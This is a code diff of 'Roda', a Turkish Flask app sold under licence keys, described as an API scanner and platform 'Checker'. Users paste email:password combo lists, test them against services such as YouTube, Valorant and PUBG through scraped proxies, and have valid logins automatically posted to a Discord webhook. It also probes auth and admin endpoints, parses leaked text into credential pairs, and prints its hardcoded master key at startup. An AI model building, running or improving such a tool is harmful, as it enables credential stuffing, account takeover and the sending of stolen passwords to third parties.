@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Roda - API Discovery + Checker (Türkçe)
-IP Bazlı Key Sistemi | Valorant | Webhook (sadece HIT) | Ayrıştırma
+Render Disk ile kalıcı key'ler | PUBG eklendi | Herkese açık ayrıştırma ve istatistikler
 """
 
 import os, json, re, time, random, string, threading, webbrowser, base64
@@ -15,11 +15,16 @@ app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
 # ============================================================
-# MASTER KEY
+# MASTER KEY (BASE64 ile gizlenmiş) ve KEYS_FILE (Render Disk)
 # ============================================================
 ENCODED_MASTER = "Um9kYUAyMDI2I1NlY3VyZSFYNw=="
 MASTER_KEY = base64.b64decode(ENCODED_MASTER).decode('utf-8')
-KEYS_FILE = "keys.json"
+
+# Render Disk mount yolu (disk ekledikten sonra)
+KEYS_FILE = "/data/keys.json"
+# Varsayılan olarak local'de çalışırken aynı klasörü kullanır:
+if not os.path.exists("/data"):
+    KEYS_FILE = "keys.json"
 
 def load_keys():
     if os.path.exists(KEYS_FILE):
@@ -28,18 +33,16 @@ def load_keys():
     return {}
 
 def save_keys(data):
+    os.makedirs(os.path.dirname(KEYS_FILE), exist_ok=True)
     with open(KEYS_FILE, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=2, ensure_ascii=False)
 
-def is_key_valid(key, client_ip=None):
+def is_key_valid(key):
     if key == MASTER_KEY:
         return True, "Admin"
     keys = load_keys()
     if key in keys:
         entry = keys[key]
-        if client_ip and entry.get("allowed_ip"):
-            if entry["allowed_ip"] != client_ip:
-                return False, None
         exp = entry.get("expires")
         if exp:
             if datetime.now() < datetime.fromisoformat(exp):
@@ -56,7 +59,7 @@ def is_admin(key):
     return valid and role == "Admin"
 
 # ============================================================
-# PLATFORMLAR
+# PLATFORMLAR (PUBG eklendi)
 # ============================================================
 PLATFORMS = [
     {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
@@ -78,24 +81,30 @@ PLATFORMS = [
     {"name": "Valorant", "domain": "valorant.com", "icon": "fa-solid fa-crosshairs"},
     {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
     {"name": "Duolingo", "domain": "duolingo.com", "icon": "fa-solid fa-language"},
-    {"name": "PUBG", "domain": "pubg.com", "icon": "fa-solid fa-crosshairs"},
+    {"name": "PUBG", "domain": "pubg.com", "icon": "fa-solid fa-crosshairs"},  # YENİ!
 ]
 
+# ============================================================
+# KATEGORİZASYON (API Discovery için)
+# ============================================================
 def categorize_endpoint(endpoint):
     ep = endpoint.lower()
-    if any(x in ep for x in ['login', 'auth', 'signin', 'signup', 'register', 'token', 'verify', 'validate', 'authenticate', 'session', 'logout', 'oauth', 'passport', 'authorize']):
+    if any(x in ep for x in ['login', 'auth', 'signin', 'signup', 'register', 'token', 'verify', 'validate', 'authenticate', 'session', 'logout', 'oauth', 'passport']):
         return 'Auth'
     elif any(x in ep for x in ['admin', 'panel', 'dashboard', 'manage', 'system', 'mod']):
         return 'Admin'
-    elif any(x in ep for x in ['user', 'profile', 'account', 'me', 'preferences', 'settings', 'my', 'player']):
+    elif any(x in ep for x in ['user', 'profile', 'account', 'me', 'preferences', 'settings', 'my']):
         return 'User'
     elif any(x in ep for x in ['health', 'ping', 'status', 'check', 'heartbeat', 'live']):
         return 'Health'
-    elif any(x in ep for x in ['api', 'v1', 'v2', 'v3', 'v4', 'rest', 'graphql', 'rpc', 'pd', 'pas']):
+    elif any(x in ep for x in ['api', 'v1', 'v2', 'v3', 'v4', 'rest', 'graphql', 'rpc']):
         return 'API'
     else:
         return 'Genel'
 
+# ============================================================
+# ENDPOINT ÇIKARICILAR
+# ============================================================
 def extract_from_html(html, base_url):
     endpoints = set()
     for m in re.finditer(r'action\s*=\s*["\']([^"\']+)["\']', html, re.I):
@@ -141,6 +150,9 @@ def extract_from_json(obj, base_url):
             endpoints.update(extract_from_json(item, base_url))
     return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]
 
+# ============================================================
+# PROXY FONKSİYONU
+# ============================================================
 def fetch_proxies():
     sources = [
         "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
@@ -161,6 +173,9 @@ def fetch_proxies():
             pass
     return list(proxies)
 
+# ============================================================
+# TARAMA MOTORU (API Discovery)
+# ============================================================
 class APIScanner:
     def __init__(self, proxy_list=None):
         self.session = requests.Session()
@@ -289,46 +304,23 @@ class APIScanner:
             "/api/hesapcomtr", "/api/hesapcomtr/v1",
             "/api/itemsatis", "/api/itemsatis/v1",
             "/api/epinify", "/api/epinify/v1",
-            # VALORANT (Riot Games API)
-            "/authorize", "/authorize?redirect_uri=http%3A%2F%2Flocalhost%2Fredirect&client_id=riot-client&response_type=token%20id_token&nonce=1&scope=openid%20link%20ban%20account%20email%20mobile_number",
-            "/api/token/v1",
-            "/userinfo",
-            "/pas/v1/service/valorant",
-            "/account-xp/v1/players/{puuid}",
-            "/store/v1/wallet/{puuid}",
-            "/store/v1/entitlements/{puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433",
-            "/mmr/v1/players/{puuid}",
-            "/restrictions/v3/player",
-            "/api/valorant", "/api/valorant/v1", "/api/valorant/v2",
-            "/api/players", "/api/players/v1",
-            "/api/matches", "/api/matches/v1",
-            "/api/rank", "/api/rank/v1",
-            "/api/skins", "/api/skins/v1",
-            "/api/storefront", "/api/storefront/v1",
-            "/api/content", "/api/content/v1",
-            "/api/status", "/api/status/v1",
-            # PUBG
-            "/api/pubg", "/api/pubg/v1", "/api/pubg/v2",
-            "/api/players", "/api/players/v1",
-            "/api/matches", "/api/matches/v1",
-            "/api/leaderboards", "/api/leaderboards/v1",
-            "/api/status", "/api/status/v1",
-            "/api/telemetry", "/api/telemetry/v1",
-            "/api/weapons", "/api/weapons/v1",
-            "/api/maps", "/api/maps/v1",
-            "/api/seasons", "/api/seasons/v1",
-            "/api/tournaments", "/api/tournaments/v1",
-            # Duolingo
+            "/api/valorant", "/api/valorant/v1",
+            "/api/minecraft", "/api/minecraft/v1",
             "/api/duolingo", "/api/duolingo/v1",
-            "/api/users", "/api/users/v1",
-            "/api/sessions", "/api/sessions/v1",
-            "/api/streak", "/api/streak/v1",
-            "/api/leaderboard", "/api/leaderboard/v1",
-            "/api/learn", "/api/learn/v1",
-            "/api/lessons", "/api/lessons/v1",
-            "/api/skills", "/api/skills/v1",
-            "/api/words", "/api/words/v1",
-            "/api/translations", "/api/translations/v1",
+            # PUBG eklemeleri
+            "/api/pubg", "/api/pubg/v1",
+            "/api/players", "/api/players/v1",
+            "/api/player", "/api/player/v1",
+            "/api/matches", "/api/matches/v1",
+            "/api/match", "/api/match/v1",
+            "/api/leaderboards", "/api/leaderboards/v1",
+            "/api/rankings", "/api/rankings/v1",
+            "/api/clans", "/api/clans/v1",
+            "/api/clan", "/api/clan/v1",
+            "/api/items", "/api/items/v1",
+            "/api/inventory", "/api/inventory/v1",
+            "/api/stats", "/api/stats/v1",
+            "/api/tournaments", "/api/tournaments/v1",
         ]
 
     def _test(self, full_url, endpoint):
@@ -404,8 +396,7 @@ def index():
 def login():
     data = request.json
     key = data.get("key", "").strip()
-    client_ip = request.remote_addr
-    valid, role = is_key_valid(key, client_ip)
+    valid, role = is_key_valid(key)
     return jsonify({"success": valid, "user": role, "isAdmin": role == "Admin"})
 
 @app.route("/api/scan", methods=["GET"])
@@ -442,29 +433,18 @@ def admin_generate():
         return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
     note = data.get("note", "Oluşturuldu")
     hours = int(data.get("hours", 24))
-    allowed_ip = data.get("allowed_ip", "").strip()
     expires = datetime.now() + timedelta(hours=hours)
     new_key = "RODA-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
     keys = load_keys()
-    keys[new_key] = {
-        "note": note,
-        "expires": expires.isoformat(),
-        "created": datetime.now().isoformat(),
-        "allowed_ip": allowed_ip if allowed_ip else ""
-    }
+    keys[new_key] = {"note": note, "expires": expires.isoformat(), "created": datetime.now().isoformat()}
     save_keys(keys)
-    return jsonify({
-        "success": True,
-        "key": new_key,
-        "expires": expires.strftime("%Y-%m-%d %H:%M:%S"),
-        "allowed_ip": allowed_ip if allowed_ip else "Herhangi IP"
-    })
+    return jsonify({"success": True, "key": new_key, "expires": expires.strftime("%Y-%m-%d %H:%M:%S")})
 
 @app.route("/api/admin/delete", methods=["POST"])
 def admin_delete():
     data = request.json
     key = data.get("master_key")
-    if not is_admin(key)):
+    if not is_admin(key):
         return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
     keys = load_keys()
     target = data.get("target_key", "")
@@ -520,7 +500,7 @@ def fetch_proxies_route():
         return jsonify({"success": False, "error": str(e)})
 
 # ============================================================
-# HTML (Checker + API Keşif + Webhook)
+# HTML (SABİT MENÜ + HERKESE AÇIK AYRIŞTIRMA VE İSTATİSTİK)
 # ============================================================
 HTML_TEMPLATE = r"""
 <!DOCTYPE html>
@@ -605,6 +585,10 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .filters label{display:flex;align-items:center;gap:4px;font-size:11px;color:#8a9bb0;cursor:pointer}
 .filters input[type=checkbox]{accent-color:var(--p);width:13px;height:13px}
 .results-container{flex:1;overflow-y:auto;border-radius:12px;background:rgba(0,0,0,0.25);border:1px solid var(--border)}
+.webhook-area{margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.webhook-area input{flex:1;min-width:150px;padding:6px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:12px;outline:none}
+.webhook-area input:focus{border-color:var(--p)}
+.webhook-area button{padding:6px 16px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:12px}
 .setting-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)}
 .setting-row label{font-size:13px;font-weight:500}
 .setting-row .desc{font-size:10px;color:var(--muted)}
@@ -652,6 +636,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 .hit-filter{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px}
 .hit-filter select{padding:4px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:6px;color:#fff;font-size:12px;outline:none}
 .hit-filter select:focus{border-color:var(--p)}
+/* AYRIŞTIRMA */
 .parse-area{display:flex;flex-direction:column;gap:10px}
 .parse-area textarea{width:100%;height:180px;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;font-family:monospace;resize:vertical;outline:none}
 .parse-area textarea:focus{border-color:var(--p)}
@@ -663,16 +648,11 @@ input:checked+.slider:before{transform:translateX(18px)}
 .discovery-platforms button{padding:4px 12px;background:rgba(255,107,0,0.06);border:1px solid rgba(255,107,0,0.1);border-radius:6px;color:#8a9bb0;font-size:11px;cursor:pointer;transition:0.2s}
 .discovery-platforms button:hover{background:rgba(255,107,0,0.12);border-color:var(--p);color:#fff}
 .discovery-platforms button.active{background:rgba(255,107,0,0.15);border-color:var(--p);color:var(--p)}
+/* İSTATİSTİK (HERKESE AÇIK) */
 .stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px}
 .stat-card-custom{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px}
 .stat-card-custom h3{font-size:12px;color:var(--muted)}
 .stat-card-custom p{font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.key-ip-input{width:200px;padding:8px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:13px;outline:none}
-.key-ip-input:focus{border-color:var(--p)}
-.webhook-area{margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
-.webhook-area input{flex:1;min-width:150px;padding:6px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:12px;outline:none}
-.webhook-area input:focus{border-color:var(--p)}
-.webhook-area button{padding:6px 16px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:12px}
 ::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(255,107,0,0.2);border-radius:4px}
 </style>
 </head>
@@ -688,7 +668,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 <div id="sidebar">
-<div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v3.3</div></div>
+<div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v3.0</div></div>
 <div class="sidebar-nav">
 <div class="nav-divider">📁 MENÜ</div>
 <div class="nav-item active" data-page="checker" onclick="switchPage('checker')"><i class="fa-solid fa-check-double"></i> Checker</div>
@@ -721,7 +701,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div id="page-checker" class="page active">
 <div class="card">
 <h3><i class="fa-solid fa-check-double"></i> Platform Checker</h3>
-<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın.</p>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın. <span style="color:var(--gold)">✅ HIT'ler otomatik webhook ile gönderilir!</span></p>
 <div class="checker-platform-select" id="checkerPlatformSelect"></div>
 <div class="checker-panel" id="checkerPanel">
 <div class="checker-top">
@@ -767,17 +747,6 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div class="hit-list" id="twofaList"><div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div></div>
 </div>
 </div>
-</div>
-<!-- WEBHOOK AYARLARI (Checker içinde) -->
-<div class="card">
-<h3><i class="fa-solid fa-link"></i> Webhook Ayarları</h3>
-<p style="font-size:12px;color:var(--muted);margin-bottom:8px">Sadece <span style="color:var(--g)">HIT</span> bulunduğunda Discord veya özel URL'ye gönderir.</p>
-<div class="webhook-area">
-<input id="webhookUrl" placeholder="Discord Webhook URL">
-<button onclick="saveWebhook()"><i class="fa-solid fa-floppy-disk"></i> Kaydet</button>
-<button onclick="testWebhook()"><i class="fa-solid fa-paper-plane"></i> Test</button>
-</div>
-<p id="webhookStatus" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
 </div>
 </div>
 <!-- PROXY -->
@@ -826,17 +795,17 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div id="resultsList"></div>
 </div>
 <div class="webhook-area">
-<input id="webhookUrl2" placeholder="Discord Webhook URL">
-<button onclick="saveWebhook2()"><i class="fa-solid fa-floppy-disk"></i> Kaydet</button>
-<button onclick="testWebhook2()"><i class="fa-solid fa-paper-plane"></i> Test</button>
-<p id="webhookStatus2" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
+<input id="webhookUrl" placeholder="Discord Webhook URL">
+<button onclick="saveWebhook()"><i class="fa-solid fa-floppy-disk"></i> Webhook Kaydet</button>
+<button onclick="testWebhook()"><i class="fa-solid fa-paper-plane"></i> Test</button>
+<p id="webhookStatus" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
 </div>
 </div>
 <!-- AYRIŞTIRMA (HERKESE AÇIK) -->
 <div id="page-parse" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-scissors"></i> Ayrıştırma</h3>
-<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Karmaşık metinleri temizler, sadece <strong>email:şifre</strong> formatındaki satırları bırakır.</p>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Karmaşık metinleri (başlıklar, numaralar, linkler) temizler, sadece <strong>email:şifre</strong> formatındaki satırları bırakır.</p>
 <div class="parse-area">
 <textarea id="parseInput" placeholder="Buraya karışık metni yapıştır..."></textarea>
 <div class="parse-buttons">
@@ -872,10 +841,8 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:6px">
 <div style="flex:1"><label style="font-size:11px;color:var(--muted)">Not</label><input class="inp" id="genNote" placeholder="Müşteri" style="margin-top:4px;padding:10px"></div>
 <div style="width:130px"><label style="font-size:11px;color:var(--muted)">Süre</label><select class="inp" id="genHours" style="margin-top:4px;padding:10px"><option value="1">1 Saat</option><option value="24" selected>24 Saat</option><option value="168">7 Gün</option><option value="720">30 Gün</option></select></div>
-<div style="flex:1"><label style="font-size:11px;color:var(--muted)">IP (opsiyonel)</label><input class="inp key-ip-input" id="genIp" placeholder="örn: 192.168.1.1" style="margin-top:4px;padding:10px;width:100%"></div>
 <button class="btn sm g" onclick="generateKey()" style="margin-top:22px"><i class="fa-solid fa-plus"></i> Oluştur</button>
 </div>
-<p style="font-size:11px;color:var(--muted);margin-top:6px">💡 IP boş bırakılırsa herhangi bir IP'den giriş yapılabilir.</p>
 </div>
 <div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
 </div>
@@ -897,6 +864,7 @@ var currentPlatform = "";
 var hitData = {};
 var parsedLines = [];
 
+// Platform listesi (PUBG eklendi)
 var platforms = [
     {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"},
     {name:"TikTok", domain:"tiktok.com", icon:"fa-brands fa-tiktok"},
@@ -965,26 +933,18 @@ document.getElementById("authKey").addEventListener("keypress", function(e) {
 });
 
 // ============================================================
-// WEBHOOK FONKSİYONLARI
+// WEBHOOK FONKSİYONLARI (SADECE HIT İÇİN)
 // ============================================================
 function saveWebhook() {
     var url = document.getElementById("webhookUrl").value.trim();
     if (url) {
         localStorage.setItem("roda_webhook_url", url);
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi! (Sadece HIT)</span>';
-        // API Keşif'teki inputu da güncelle
-        var url2 = document.getElementById("webhookUrl2");
-        if (url2) url2.value = url;
-        document.getElementById("webhookStatus2").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi! (Sadece HIT)</span>';
+        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi! (Sadece HIT gönderilir)</span>';
     } else {
         localStorage.removeItem("roda_webhook_url");
         document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
-        if (document.getElementById("webhookStatus2")) {
-            document.getElementById("webhookStatus2").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
-        }
     }
 }
-function saveWebhook2() { saveWebhook(); }
 
 function getWebhookUrl() {
     return localStorage.getItem("roda_webhook_url") || "";
@@ -993,14 +953,8 @@ function getWebhookUrl() {
 function loadWebhookUrl() {
     var url = getWebhookUrl();
     if (url) {
-        var inp = document.getElementById("webhookUrl");
-        if (inp) inp.value = url;
-        var inp2 = document.getElementById("webhookUrl2");
-        if (inp2) inp2.value = url;
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi</span>';
-        if (document.getElementById("webhookStatus2")) {
-            document.getElementById("webhookStatus2").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi</span>';
-        }
+        document.getElementById("webhookUrl").value = url;
+        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi (Sadece HIT)</span>';
     }
 }
 
@@ -1016,7 +970,7 @@ function sendCheckerWebhook(platform, email, password) {
 }
 
 function testWebhook() {
-    var url = document.getElementById("webhookUrl").value.trim() || getWebhookUrl();
+    var url = document.getElementById("webhookUrl").value.trim();
     if (!url) return alert("Webhook URL girin!");
     fetch(url, {
         method: "POST",
@@ -1034,7 +988,6 @@ function testWebhook() {
         document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>';
     });
 }
-function testWebhook2() { testWebhook(); }
 
 // ============================================================
 // PLATFORM YÜKLEME
@@ -1144,7 +1097,7 @@ function renderHits() {
 }
 
 // ============================================================
-// İSTATİSTİK
+// İSTATİSTİK (HERKESE AÇIK)
 // ============================================================
 function updateStatsUI() {
     document.getElementById("sideTotal").innerText = foundEndpoints.length;
@@ -1364,7 +1317,7 @@ function loadParseFile() {
 }
 
 // ============================================================
-// SAYFA GEÇİŞİ
+// SAYFA GEÇİŞİ (SABİT MENÜ)
 // ============================================================
 function switchPage(page) {
     if ((page === "discovery" || page === "keys") && !isAdmin) {
@@ -1399,7 +1352,7 @@ function switchPage(page) {
 }
 
 // ============================================================
-// PROXY FONKSİYONLARI
+// PROXY FONKSİYONLARI (HERKESE AÇIK)
 // ============================================================
 function fetchProxies() {
     document.getElementById("proxyCount").innerText = "Çekiliyor...";
@@ -1424,7 +1377,7 @@ function toggleProxy() {
 }
 
 // ============================================================
-// ADMIN FONKSİYONLARI
+// ADMIN FONKSİYONLARI (SADECE ADMIN)
 // ============================================================
 function loadKeys() {
     if (!isAdmin) return;
@@ -1437,8 +1390,7 @@ function loadKeys() {
             for (var k in d) {
                 var v = d[k];
                 var exp = v.expires ? new Date(v.expires).toLocaleString() : "Süresiz";
-                var ip = v.allowed_ip || "Herhangi";
-                html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)"><div><strong style="font-size:13px">' + k + '</strong><br><small style="color:var(--muted);font-size:10px">' + v.note + ' | ' + exp + ' | IP: ' + ip + '</small></div><button class="btn sm r" onclick="deleteKey(\'' + k + '\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
+                html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)"><div><strong style="font-size:13px">' + k + '</strong><br><small style="color:var(--muted);font-size:10px">' + v.note + ' | ' + exp + '</small></div><button class="btn sm r" onclick="deleteKey(\'' + k + '\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
             }
             list.innerHTML = html || '<p style="color:var(--muted);font-size:12px">Hiç key yok.</p>';
         })
@@ -1449,16 +1401,15 @@ function generateKey() {
     if (!isAdmin) return;
     var note = document.getElementById("genNote").value || "Oluşturuldu";
     var hours = document.getElementById("genHours").value;
-    var allowed_ip = document.getElementById("genIp").value.trim();
     fetch("/api/admin/generate", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ master_key: currentKey, note: note, hours: hours, allowed_ip: allowed_ip })
+        body: JSON.stringify({ master_key: currentKey, note: note, hours: hours })
     })
     .then(function(r) { return r.json(); })
     .then(function(d) {
         if (d.success) {
-            alert("Key Oluşturuldu!\n\nKey: " + d.key + "\nBitiş: " + d.expires + "\nIP: " + d.allowed_ip);
+            alert("Key Oluşturuldu!\n\nKey: " + d.key + "\nBitiş: " + d.expires);
             loadKeys();
         } else alert("Başarısız: " + (d.error || ""));
     })
@@ -1570,7 +1521,7 @@ function sendWebhook() {
         alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
         return;
     }
-    var url = document.getElementById("webhookUrl").value.trim() || getWebhookUrl();
+    var url = document.getElementById("webhookUrl").value.trim();
     if (!url) return alert("Webhook URL girin");
     var categories = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c) { return c.value; });
     if (!categories.length) return alert("En az bir kategori seçin");
@@ -1603,7 +1554,7 @@ function exportJSON() {
 """
 
 # ============================================================
-# BAŞLAT
+# BAŞLAT (Render uyumlu)
 # ============================================================
 if __name__ == "__main__":
     if not os.path.exists(KEYS_FILE):
@@ -1616,10 +1567,11 @@ if __name__ == "__main__":
     ╔══════════════════════════════════════════════════════════════════╗
     ║     🔱 RODA - API KEŞİF + CHECKER + AYRIŞTIRMA (TÜRKÇE)        ║
     ║     Render üzerinde çalışıyor                                  ║
-    ║     🔒 IP Bazlı Key Sistemi Aktif                             ║
-    ║     ✅ Valorant (Riot API) eklendi                           ║
-    ║     ✅ Webhook (sadece HIT) - Checker içinde de var          ║
+    ║     Giriş anahtarı: Roda@2026#Secure!X7                       ║
+    ║     http://0.0.0.0:""" + str(port) + """                               ║
+    ║     PUBG API eklendi                                           ║
     ║     Ayrıştırma ve istatistikler herkese açık                  ║
+    ║     Key'ler süresi boyunca kalıcı (Render Disk)               ║
     ╚══════════════════════════════════════════════════════════════════╝
     """)
 
